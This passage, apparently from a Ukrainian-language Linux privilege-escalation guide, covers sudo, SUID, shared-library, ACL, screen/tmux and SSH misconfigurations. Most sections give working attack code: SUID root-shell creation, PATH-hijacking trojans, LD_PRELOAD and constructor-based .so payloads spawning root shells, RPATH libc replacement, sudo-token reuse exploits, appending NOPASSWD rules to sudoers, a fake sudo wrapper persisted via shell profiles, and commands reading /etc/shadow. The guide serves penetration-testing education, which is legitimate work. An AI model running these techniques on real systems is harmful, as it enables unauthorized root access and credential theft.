cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform не пройде рукостискання Go-плагіна, але перед завершенням виконає payload із правами root, залишивши після себе SUID shell.

### Перевизначення TF_VAR + обхід перевірки symlink

Змінні Terraform можна передавати через змінні середовища `TF_VAR_<name>`, якщо відповідне правило sudo зберігає їх. Для **читання** через symlink джерела також потрібен provider, який переходить за посиланням і копіює захищений результат у місце призначення, доступне для читання користувачу. Для **запису** через symlink місця призначення окремо потрібен контрольований користувачем запис у місці призначення та привілейований provider, який переходить за посиланням під час запису; заплановане завдання — лише один із можливих наслідків. Перш ніж тестувати будь-який із цих способів, перевірте точний дозвіл sudo, відповідні файли `.tf`, вибраний CLI config і власників шляхів за допомогою команд, що лише читають дані, наприклад `sudo -l`, `stat` і `readlink`. Слабкі лексичні перевірки на кшталт `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` не розв’язують symlink:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform розіменовує symlink і копіює справжній `/root/root.txt` у destination, доступний для читання зловмисником. Цей самий підхід можна використати, щоб **записувати** у привілейовані шляхи, попередньо створивши symlink-и призначення (наприклад, вказавши шлях призначення провайдера всередині `/etc/cron.d/`).

### requiretty / !requiretty

У деяких старих дистрибутивах sudo можна налаштувати з `requiretty`, що змушує sudo запускатися лише з інтерактивного TTY. Якщо встановлено `!requiretty` (або параметр відсутній), sudo можна виконувати з неінтерактивних контекстів, як-от reverse shell, cron jobs або скрипти.

```bash
Defaults !requiretty
```

Це саме по собі не є прямою вразливістю, але розширює ситуації, у яких можна зловживати правилами sudo без повноцінного PTY.

### Sudo env_keep+=PATH / insecure secure_path → перехоплення PATH

Якщо `sudo -l` показує `env_keep+=PATH` або `secure_path` містить доступні для запису зловмисником шляхи (наприклад, `/home/<user>/bin`), зовнішню команду без повного шляху в цілі, дозволеній через sudo, можна підмінити.<sup>[[3]](#references)</sup> Також варто перевірити відсутність ефективного `secure_path`, **якщо** середовище sudo команди зберігає контрольований користувачем `PATH`; сама по собі відсутність `secure_path` цього не доводить. Прочитайте дозволений скрипт, не запускаючи його, а потім перевірте точне правило RunAs та аргументів, ефективний шлях пошуку команд і доступний для запису та обходу каталог, розташований раніше в PATH і такий, що містить ім’я команди. Автентифікація, `NOEXEC`, вбудовані команди оболонки й абсолютні шляхи до команд можуть змінити результат.

- Вимоги: правило sudo (часто `NOPASSWD`), що запускає скрипт/бінарний файл, який викликає команди без абсолютних шляхів (`free`, `df`, `ps` тощо), і доступний для запису елемент PATH, який перевіряється першим.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Обхід обмежень шляхів під час виконання команд через sudo
**Перейдіть** до інших файлів або використовуйте **symlinks**. Наприклад, у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Якщо використовується **wildcard** (\*), це ще простіше:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Заходи протидії**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Команда Sudo/SUID-бінарний файл без шляху до команди

Якщо **дозвіл sudo** надано для однієї команди **без зазначення шляху**: _hacker10 ALL= (root) less_, це можна exploit, змінивши змінну PATH.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Цей метод також можна використовувати, якщо **suid**-бінарний файл **виконує іншу команду, не вказуючи шлях до неї (завжди перевіряйте вміст незнайомого SUID-бінарного файла за допомогою** _**strings**_**)**.

[Приклади payload для виконання.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID-бінарний файл зі шляхом до команди

Якщо **suid**-бінарний файл **виконує іншу команду, вказуючи шлях**, можна спробувати **експортувати функцію** з назвою команди, яку викликає файл suid.

Наприклад, якщо suid-бінарний файл викликає _**/usr/sbin/service apache2 start**_, спробуйте створити й експортувати функцію:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Тоді, коли ви запустите бінарний файл із SUID, виконається ця функція

### Власні обгортки для копіювання з SUID

Утиліта з SUID, що належить root і приймає шляхи до джерела та призначення, може перетинати дві різні межі довіри. Якщо вона формує shell-команду з будь-якого аргументу (наприклад, передає сконструйовану команду `cp` до `system()`), метасимволи shell можуть запустити іншу команду з ефективними привілеями. Навіть якщо вона безпечно викликає `cp` без shell, необмежений шлях призначення може дозволити довільний привілейований запис у файли, наприклад `/etc/passwd`. Перевірте обробку аргументів обгорткою, поведінку effective UID, обмеження для призначення та те, чи зберігає скопійований файл вміст, контрольований користувачем; типове повідомлення про помилку `cp` або сам біт SUID не доводять жодного з цих сценаріїв. Спершу пасивно перевірте бінарний файл і його дозволи, перш ніж проводити будь-яке ручне тестування.

### Скрипт із правом запису, який запускає SUID-обгортка

Поширена неправильна конфігурація custom app — обгортка-бінарний файл із SUID, що належить root і запускає скрипт, доступний для запису користувачам із низькими привілеями.

Типовий шаблон:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Якщо `/usr/local/bin/backup.sh` доступний для запису, можна додати команди payload, а потім виконати SUID-обгортку:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Швидкі перевірки:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Цей шлях атаки особливо поширений у «maintenance»/«backup» обгортках, що постачаються в `/usr/local/bin`.

### LD_PRELOAD і **LD_LIBRARY_PATH**

Змінна середовища **LD_PRELOAD** використовується для зазначення однієї або кількох спільних бібліотек (файлів .so), які завантажувач завантажує раніше за всі інші, зокрема стандартну бібліотеку C (`libc.so`). Цей процес називається попереднім завантаженням бібліотеки.

Однак, щоб підтримувати безпеку системи й запобігати використанню цієї функції для атак, особливо з виконуваними файлами **suid/sgid**, система застосовує певні обмеження:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, у яких реальний ідентифікатор користувача (_ruid_) не збігається з ефективним ідентифікатором користувача (_euid_).
- Для виконуваних файлів із suid/sgid попередньо завантажуються лише бібліотеки зі стандартних шляхів, які також мають suid/sgid.

Підвищення привілеїв можливе, якщо ви можете виконувати команди через `sudo`, а в результатах `sudo -l` є запис **env_keep+=LD_PRELOAD**. Така конфігурація дає змогу зберігати змінну середовища **LD_PRELOAD** і враховувати її навіть під час виконання команд через `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Збережіть як **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Потім **скомпілюйте його** за допомогою:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Нарешті, **підвищте привілеї**, запустивши

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Схожий privesc можна використати, якщо зловмисник контролює змінну середовища **LD_LIBRARY_PATH**, оскільки він контролює шлях, за яким шукатимуться бібліотеки.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID-бінарний файл – .so injection

Якщо ви натрапили на бінарний файл із правами **SUID**, який здається незвичним, варто перевірити, чи правильно він завантажує файли **.so**. Це можна зробити, виконавши таку команду:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Наприклад, помилка на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ свідчить про потенційну можливість експлуатації.

Щоб скористатися цим, потрібно створити C-файл, наприклад _"/path/to/.config/libcalc.c"_, із таким кодом:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Цей код після компіляції та виконання має підвищити привілеї, змінивши дозволи файлів і запустивши оболонку з підвищеними привілеями.

Скомпілюйте наведений вище файл C у спільний об’єкт (.so) за допомогою:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Зрештою, запуск ураженого SUID-бінарного файла має активувати exploit, що може призвести до компрометації системи.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Тепер, коли ми знайшли SUID-бінарний файл, який завантажує бібліотеку з каталогу, до якого маємо право запису, створімо в цьому каталозі бібліотеку з потрібною назвою:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Якщо ви отримуєте помилку на кшталтેણ

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

це означає, що згенерована вами бібліотека має містити функцію під назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це добірка бінарних файлів Unix, які зловмисник може використати, щоб обійти локальні обмеження безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — те саме, але для випадків, коли можна **лише ін’єктувати аргументи** в команду.

Проєкт збирає легітимні функції бінарних файлів Unix, якими можна скористатися, щоб вийти з обмежених оболонок, підвищити або зберегти привілеї, передавати файли, запускати bind- і reverse-shells, а також виконувати інші завдання після експлуатації.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви маєте доступ до `sudo -l`, скористайтеся інструментом [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), щоб перевірити, чи знайде він спосіб експлуатації якогось правила sudo.

### Повторне використання токенів Sudo

Якщо у вас є **доступ до sudo**, але немає пароля, можна підвищити привілеї, **дочекавшись виконання команди sudo, а потім перехопивши токен сеансу**.<sup>[[18]](#references)</sup>

Вимоги для підвищення привілеїв:

- Ви вже маєте оболонку від імені користувача "_sampleuser_"
- "_sampleuser_" **використовував `sudo`**, щоб виконати якусь команду **протягом останніх 15 хвилин** (типово саме стільки діє токен sudo, який дає змогу використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` повертає 0
- `gdb` доступний (ви маєте змогу його завантажити)

(Тимчасово ввімкнути `ptrace_scope` можна командою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`, а постійно — змінивши `/etc/sysctl.d/10-ptrace.conf` і задавши `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконано, **можна підвищити привілеї за допомогою:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Перший експлойт** (`exploit.sh`) створить бінарний файл `activate_sudo_token` у _/tmp_. Його можна використати, щоб **активувати токен sudo у своєму сеансі** (root-оболонка не запуститься автоматично, виконайте `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **Другий експлойт** (`exploit_v2.sh`) створить оболонку sh у _/tmp_, **яка належить root і має setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **Третій експлойт** (`exploit_v3.sh`) **створить файл sudoers**, який робить **токени sudo безстроковими та дозволяє всім користувачам використовувати sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Якщо у вас є **права на запис** у папку або в будь-який із створених у ній файлів, ви можете скористатися бінарним файлом [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), щоб **створити токен sudo для користувача та PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і маєте shell від імені цього користувача з PID 1234, ви можете **отримати привілеї sudo**, не знаючи пароля:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` і файли в `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. За замовчуванням ці файли **можуть читати лише користувач root і група root**.\
**Якщо** ви можете **читати** цей файл, то зможете **отримати цікаву інформацію**, а якщо зможете **записати** будь-який файл — зможете **підвищити привілеї**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Якщо ви можете записувати, ви можете зловживати цим дозволом.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Ще один спосіб зловживати цими дозволами:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Існують альтернативи бінарному файлу `sudo`, наприклад `doas` для OpenBSD. Не забудьте перевірити його конфігурацію у `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Якщо `doas` дозволяє використовувати редактор або інтерпретатор, перевірте способи виходу в стилі GTFOBins:

```bash
doas vim
:!/bin/sh
```

A root-capable rule `doas` для оригінального Python-based `dstat` також заслуговує на перевірку шляху до плагінів. У його [посібнику](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) та [вихідному коді](https://github.com/dstat-real/dstat/blob/master/dstat) серед каталогів для плагінів `dstat_*.py` вказано `/usr/share/dstat/` і `/usr/local/share/dstat/`. Якщо поточний користувач може записувати в розташування, яке фактично використовує встановлена збірка, і шукати в ньому, вибраний плагін може запускатися з ідентичністю RunAs, заданою в `doas`. Перевірте ефективне правило, пошук плагінів у цій збірці, дозволи або ACL каталогу та його батьківських каталогів, а також чи може користувач вибрати плагін; саме лише правило `dstat` або каталог із правами на запис — це лише зачіпка. Інші реалізації `dstat` можуть використовувати інші системи плагінів. Переглядайте метадані пасивно, не завантажуючи плагін.

### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини та використовує `sudo`** для підвищення привілеїв, і вам вдалося отримати shell у контексті цього користувача, ви можете **створити новий виконуваний файл `sudo`**, який запустить ваш код від імені root, а потім виконає команду користувача. Потім **змініть `$PATH`** у контексті користувача (наприклад, додавши новий шлях у `.bash_profile`), щоб під час запуску `sudo` користувачем виконувався ваш виконуваний файл `sudo`.

Зверніть увагу, що якщо користувач використовує іншу оболонку (не bash), вам потрібно буде змінити інші файли, щоб додати новий шлях. Наприклад, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ще один приклад можна знайти в [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустити щось на кшталт:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Спільна бібліотека

### ld.so

Файл `/etc/ld.so.conf` вказує, **звідки беруться файли конфігурації, що завантажуються**. Зазвичай цей файл містить такий шлях: `include /etc/ld.so.conf.d/*.conf`

Це означає, що файли конфігурації з `/etc/ld.so.conf.d/*.conf` буде прочитано. Ці файли конфігурації **вказують на інші папки**, у яких **шукатимуться** **бібліотеки**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — `/usr/local/lib`. **Це означає, що система шукатиме бібліотеки в `/usr/local/lib`**.

Якщо з будь-якої причини **користувач має права на запис** до будь-якого із зазначених шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-якого файлу всередині `/etc/ld.so.conf.d/` або будь-якої папки, зазначеної у файлі конфігурації всередині `/etc/ld.so.conf.d/*.conf`, він може отримати підвищені привілеї.\
Ознайомтеся з **тим, як експлуатувати цю неправильну конфігурацію**, на цій сторінці:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Після копіювання бібліотеки до `/var/tmp/flag15/` програма використовуватиме її звідти, як указано у змінній `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Потім створіть шкідливу бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Можливості

Linux capabilities надають **процесу підмножину доступних привілеїв root**. По суті, це розділяє привілеї root **на менші й окремі одиниці**. Кожну з цих одиниць можна незалежно надавати процесам. Так повний набір привілеїв зменшується, що знижує ризики експлуатації.\
Прочитайте наступну сторінку, щоб **дізнатися більше про capabilities і про те, як їх зловживати**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Дозволи каталогів

У каталозі **біт «виконання»** означає, що відповідний користувач може виконати команду «**cd**», щоб перейти до папки.\
Біт **«читання»** означає, що користувач може **переглядати список** **файлів**, а біт **«запис»** означає, що користувач може **видаляти** та **створювати** нові **файли**.

## ACL

Списки контролю доступу (ACL) є другим рівнем дискреційних дозволів і можуть **перевизначати традиційні дозволи ugo/rwx**. Ці дозволи дають змогу краще контролювати доступ до файлів і каталогів: надавати або забороняти права певним користувачам, які не є власниками чи учасниками групи. Такий рівень **гранулярності забезпечує точніше керування доступом**. Докладніше дивіться [**тут**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Надайте** користувачеві «kali» дозволи на читання та запис для файлу:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Отримати** файли з певними ACL у системі:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Прихований бекдор ACL у додаткових файлах sudoers

Поширена помилка конфігурації — файл у `/etc/sudoers.d/`, що належить root і має права `440`, але все ще надає користувачу з низькими привілеями доступ на запис через ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Якщо ви бачите щось на кшталт `user:alice:rw-`, користувач може дописати правило sudo, незважаючи на обмежувальні біти режиму доступу:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Це шлях до persistence/підвищення привілеїв через ACL із високим впливом, оскільки його легко не помітити під час перевірки лише за допомогою `ls -l`.

## Відкриті сеанси оболонки

Можливість доступу до сеансів GNU Screen інших користувачів залежить від **конфігурації запущеного сеансу та ACL**, а не лише від версії. [У документації GNU Screen](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) зазначено, що програму потрібно зібрати з підтримкою multiuser; параметр `multiuser on` і дозвіл `acladd` або відповідний дозвіл `aclchg` дають іншому користувачеві змогу під'єднатися. [У посібнику також вимагається setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) для пошуку сеансів між користувачами. Видимий сокет, власником якого є root, або сам по собі бінарний файл `screen` із SUID не підтверджують, що до оболонки root можна під'єднатися. Перш ніж вважати це підвищенням привілеїв, переконайтеся, що активний сеанс працює в режимі multiuser, поточний користувач має ефективні дозволи на введення команд і виконання команд, а оболонка в цьому сеансі працює від імені привілейованого власника.

### Перехоплення сеансів screen

**Переглянути список сеансів screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking — розташування сокетів (у деяких системах один із них доступний як символьне посилання на інший): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Підключення до сеансу**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## Перехоплення сеансів tmux

Це була проблема **старих версій tmux**. Мені не вдалося перехопити сеанс tmux (v2.1), створений root, будучи непривілейованим користувачем.

**Перелік сеансів tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Розташування сокетів (деякі системи надають один як символічне посилання на інший) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Перелік за допомогою цього сокета; за допомогою цього сокета можна запустити сеанс tmux...](<../../images/image (837).png>)

**Під’єднатися до сеансу**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Перегляньте **Valentine box from HTB** як приклад.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Ключі, згенеровані вразливими збірками OpenSSL у Debian або похідних дистрибутивах у період історичної вразливості, можуть мати передбачувану випадковість; поточний дистрибутив хоста або виправлена версія OpenSSL не підтверджують, як було згенеровано старий ключ. Перевірте **конкретний ключ** за відповідним історичним чорним списком і з'ясуйте його походження. У посібнику Debian [`ssh-vulnkey`](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) описано перевірку відкритих ключів і `authorized_keys`, а в [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) зафіксовано виправлення OpenSSL. Запис у `authorized_keys` привілейованого облікового запису є лише зачіпкою для підвищення привілеїв, якщо відповідний приватний ключ можна отримати й чинна політика SSH усе ще приймає цей ключ для цього облікового запису; слабкий ключ **хоста** сам по собі не є обліковими даними для входу. Замініть скомпрометовані ключі та видаліть їхні старі дозволи.

### Цікаві параметри конфігурації SSH

- **PasswordAuthentication:** визначає, чи дозволена автентифікація за паролем. Типове значення в upstream OpenSSH — `yes`; конфігурація дистрибутива може його перевизначити.
- **PubkeyAuthentication:** визначає, чи дозволена автентифікація за відкритим ключем. Типове значення — `yes`.
- **PermitEmptyPasswords**: якщо автентифікація за паролем дозволена, визначає, чи дозволяє сервер вхід в облікові записи з порожніми паролями. Типове значення — `no`.

### Файли керування входом

Ці файли визначають, хто і як може ввійти:

- **`/etc/nologin`**: якщо файл існує, він блокує вхід не-root користувачам і виводить своє повідомлення.
- **`/etc/securetty`**: обмежує місця, звідки root може ввійти (список дозволених TTY).
- **`/etc/motd`**: банер після входу (може розкривати відомості про середовище або технічне обслуговування).

### PermitRootLogin

Визначає, чи може root увійти через ssh. Типове значення в upstream OpenSSH — `prohibit-password`; конфігурація дистрибутива може його перевизначити. Можливі значення:

- `yes`: root може входити за допомогою пароля та приватного ключа
- `without-password` або `prohibit-password`: root може входити лише за допомогою приватного ключа
- `forced-commands-only`: root може входити лише за допомогою приватного ключа та за умови, що вказано параметри команд
- `no` : ні

### Довірені центри сертифікації SSH-користувачів

`TrustedUserCAKeys` задає відкриті ключі, яким sshd довіряє під час підписання сертифікатів **користувачів**. Якщо відповідний приватний ключ CA доступний для читання користувачу з нижчими привілеями, з'ясуйте, хто може отримати сертифікат і для яких principal облікових записів він може пройти автентифікацію. `AuthorizedPrincipalsFile` або `AuthorizedPrincipalsCommand` можуть обмежувати прийняті імена; якщо не налаштовано жоден із них, сертифікат має містити ім'я цільового облікового запису. `PermitRootLogin prohibit-password` блокує автентифікацію root за паролем, але все ще може дозволяти автентифікацію за сертифікатом. Самого відкритого шляху до ключа недостатньо, щоб підтвердити доступ: перевірте пару відкритого та приватного ключів, чинні правила `Match`, політику облікового запису, парольну фразу ключа, відкликання та прийняті алгоритми підпису. Не додавайте байти приватного ключа до результатів переліку. Див. [посібник із конфігурації сервера OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Приватний ключ CA також може бути придатним до використання **навіть без доступу до читання** поточним користувачем, якщо правило делегування привілеїв дозволяє цьому користувачу викликати необмежений [підписувач сертифікатів, як-от `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) від імені власника ключа. Зіставте точну дозволену команду й аргументи з доступом облікового запису підписувача до ключа, відкритим ключем CA, якому довіряє чинна конфігурація sshd, principal, прийнятим для цільового облікового запису, строком дії сертифіката та політикою входу цього облікового запису. Делегована команда підписувача або файл довіреного CA самі по собі не підтверджують доступ до іншого облікового запису; не підписуйте тестовий сертифікат під час пасивного переліку.

### AuthorizedKeysFile

Визначає файли, що містять відкриті ключі, які можна використовувати для автентифікації користувачів. У ньому можуть бути такі токени, як `%h`, які буде замінено на домашній каталог. **Можна вказати абсолютні шляхи** (що починаються з `/`) або **відносні шляхи від домашнього каталогу користувача**. Наприклад:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Ця конфігурація вказує, що якщо ви спробуєте виконати login за допомогою **приватного** ключа користувача "**testusername**", ssh порівняє відкритий ключ вашого ключа з ключами, розташованими в `/home/testusername/.ssh/authorized_keys` і `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дає змогу **використовувати локальні SSH-ключі замість того, щоб залишати ключі** (без парольних фраз!) на сервері. Тож ви зможете через ssh **перейти** **на хост**, а звідти **перейти на інший** хост, **використовуючи** **ключ**, розташований на вашому **початковому хості**.

Потрібно встановити цю опцію в `$HOME/.ssh.config` ось так:

```
Host example.com
  ForwardAgent yes
```

Зверніть увагу: якщо `Host` щоразу має значення `*`, коли користувач переходить на іншу машину, цей хост зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перевизначити** ці **параметри** та дозволити або заборонити таку конфігурацію.\
Файл `/etc/sshd_config` може **дозволити** або **заборонити** пересилання ssh-agent за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням дозволено).

Якщо ви виявите, що Forward Agent налаштовано в середовищі, перегляньте таку сторінку: **можливо, ви зможете зловживати цією функцією для підвищення привілеїв**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` і файли в каталозі `/etc/profile.d/` — це **скрипти, які виконуються, коли користувач запускає нову оболонку**. Тому, якщо ви можете **записувати або змінювати будь-який із них, ви можете підвищити привілеї**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Якщо знайдено якийсь підозрілий скрипт профілю, перевірте його на наявність **конфіденційних даних**.

### Файли Passwd/Shadow

Залежно від ОС файли `/etc/passwd` і `/etc/shadow` можуть мати інші назви або резервні копії. Тому рекомендується **знайти всі такі файли** й **перевірити, чи можна їх прочитати**, щоб з’ясувати, **чи містять вони хеші**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Іноді **хеші паролів** можна знайти у файлі `/etc/passwd` (або еквівалентному файлі).

```bash
